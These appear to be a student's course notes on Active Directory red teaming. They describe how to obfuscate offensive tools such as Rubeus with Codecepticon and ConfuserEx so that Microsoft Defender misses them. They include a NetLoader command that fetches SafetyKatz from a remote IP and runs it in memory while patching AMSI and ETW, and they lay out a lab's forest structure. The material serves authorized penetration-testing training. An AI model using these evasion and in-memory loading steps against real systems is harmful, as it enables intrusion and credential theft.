# Topic: AV Evasion, Binary Obfuscation & Lab Environment
**Date:** 18 July 2026

---

# Antivirus (AV) Signature Bypass

Modern antivirus solutions such as **Microsoft Defender** primarily rely on **signature-based detection**, where known byte patterns, strings, function names, and other identifiable characteristics are compared against malware signatures. If a match is found, the file is quarantined or blocked. To avoid these detections during red team engagements and penetration testing, binaries and PowerShell scripts can be **obfuscated**, making them appear different while preserving their original functionality.

---

# Codecepticon

**Codecepticon** is an open-source C# source code obfuscator that modifies the source code before compilation. Instead of simply changing the compiled executable, it renames classes, methods, variables, rewrites strings, and obfuscates identifiers, making signature-based detection much more difficult.

**Reference**
https://github.com/Accenture/Codecepticon

### Features

- Source code obfuscation
- Renames classes, methods and variables
- Generates realistic identifiers using Markov chains
- String obfuscation
- XOR string encryption
- Mapping report generation

---

## Example Command

```powershell
C:\AD\Tools\Codecepticon.exe --action obfuscate --module csharp --verbose ^
-path "C:\AD\Tools\Rubeus-master\Rubeus.sln" ^
--map-file "C:\AD\Tools\Rubeus-master\Mapping.html" ^
--profile rubeus ^
--rename ncefpavs ^
--rename-method markov ^
--markov-min-length 3 ^
--markov-max-length 10 ^
--markov-min-words 3 ^
--markov-max-words 5 ^
--string-rewrite ^
--string-rewrite-method xor
```

### Command Breakdown

| Parameter | Purpose |
|-----------|----------|
| `--action obfuscate` | Starts the obfuscation process |
| `--module csharp` | Specifies that the project is written in C# |
| `--verbose` | Displays detailed execution logs |
| `--path` | Specifies the Visual Studio solution (`.sln`) to obfuscate |
| `--map-file` | Generates an HTML report mapping original names to obfuscated names |
| `--profile rubeus` | Uses a predefined obfuscation profile for Rubeus |
| `--rename` | Renames classes, methods and variables |
| `--rename-method markov` | Generates realistic-looking names using Markov chains |
| `--markov-*` | Controls the generated identifier length |
| `--string-rewrite` | Obfuscates string literals |
| `--string-rewrite-method xor` | Encrypts strings using XOR |

---

# ConfuserEx

After modifying the source code, the compiled executable can be obfuscated again using **ConfuserEx**.

**Reference**

https://mkaring.github.io/ConfuserEx/

ConfuserEx is a **free .NET obfuscator** that protects compiled executables by:

- Renaming metadata
- Obfuscating control flow
- Encrypting strings
- Protecting resources
- Making reverse engineering significantly harder

It is commonly used to reduce **signature-based antivirus detections** on .NET binaries.

---

# DefenderCheck

After obfuscation, the binary or PowerShell script can be scanned using **DefenderCheck** to determine whether Microsoft Defender still detects any signatures.

### Workflow

```text
Original Binary
       │
       ▼
Codecepticon
       │
       ▼
Compile
       │
       ▼
ConfuserEx
       │
       ▼
DefenderCheck
       │
       ▼
Detection?
       │
   Yes ──► Modify Source
       │
   No
       ▼
Ready for Lab
```

If DefenderCheck reports a detection offset, that location can be modified before recompiling.

---

# NetLoader

Instead of writing binaries to disk, **NetLoader** can be used to download and execute payloads.

Features include:

- Load binaries from local disk
- Load binaries from a remote URL
- Patch AMSI
- Patch ETW
- Execute binaries directly in memory

Example:

```powershell
C:\Users\Public\Loader.exe -path http://172.16.100.X/SafetyKatz.exe
```

In the CRTP lab, **NetLoader itself is also obfuscated using Codecepticon and ConfuserEx**, allowing it to evade Windows Defender while delivering payloads.

---

# Typical AV Evasion Workflow

```text
Source Code
     │
     ▼
Codecepticon
(Source Code Obfuscation)
     │
     ▼
Compile Binary
     │
     ▼
ConfuserEx
(Binary Obfuscation)
     │
     ▼
DefenderCheck
(Check AV Detection)
     │
     ▼
NetLoader
(Load Binary in Memory)
     │
     ▼
Execute Payload
```

---

# Attack Methodology

The CRTP course follows a structured Active Directory attack methodology. Rather than attacking the Domain Controller immediately, the engagement progresses through several stages.

```text
Recon
   │
   ▼
Domain Enumeration
   │
   ▼
Local Privilege Escalation
   │
   ▼
Administrative Reconnaissance
   │
   ▼
Lateral Movement
   │
   ▼
Domain Privilege Escalation
   │
   ▼
Cross-Forest / Cross-Trust Attacks
   │
   ▼
Persistence & Data Exfiltration
```

### Phase Descriptions

**Recon**
- Gather information about the target environment.

**Domain Enumeration**
- Enumerate users, groups, computers, trusts, shares, and policies.

**Local Privilege Escalation**
- Gain SYSTEM or Administrator privileges on compromised hosts.

**Administrative Recon**
- Identify privileged accounts, sessions, delegation, ACLs, and administrative paths.

**Lateral Movement**
- Move between systems using compromised credentials or Kerberos tickets.

**Domain Privilege Escalation**
- Escalate privileges to Domain Admin or equivalent.

**Cross-Trust Attacks**
- Pivot into trusted domains or forests.

**Persistence & Exfiltration**
- Maintain long-term access and collect sensitive data.

---

# CRTP Lab Environment

The practical exercises are performed inside a fictional financial organization called **moneycorp**.

## Lab Characteristics

- Fully patched Windows Server 2022 machines
- Microsoft Defender enabled
- Server 2016 Forest Functional Level
- Multiple forests
- Multiple domains
- Minimal firewall restrictions to focus on Active Directory concepts

---

## Forest Structure

### Forest 1

```
moneycorp.local
```

Contains:

- mcorp-dc
- Student VM

### Child Domains

```
dollarcorp.moneycorp.local
```

Contains:

- dcorp-dc
- dcorp-ci
- dcorp-mgmt
- dcorp-mssql
- dcorp-adminsrv
- dcorp-appsrv
- dcorp-sql1

```
us.dollarcorp.moneycorp.local
```

Contains:

- us-dc

---

### Forest 2

```
eurocorp.local
```

Contains:

- eurocorp-dc

Child Domain:

```
eu.eurocorp.local
```

Contains:

- eu-dc
- eu-sql

---

## Trust Relationship

The lab contains **multiple forests connected through trust relationships**, allowing students to practice:

- Cross-domain attacks
- Cross-forest attacks
- Trust abuse
- Lateral movement
- Kerberos attacks
- Enterprise administration scenarios

---

# Key Takeaways

- Signature-based AV detection can often be reduced through source code and binary obfuscation.
- **Codecepticon** obfuscates C# source code before compilation.
- **ConfuserEx** obfuscates compiled .NET executables.
- **DefenderCheck** helps identify remaining antivirus signatures.
- **NetLoader** delivers binaries directly into memory while patching AMSI and ETW.
- The CRTP lab simulates a realistic enterprise Active Directory environment with multiple domains, forests, and trust relationships, allowing students to practice the complete attack lifecycle from reconnaissance to persistence.
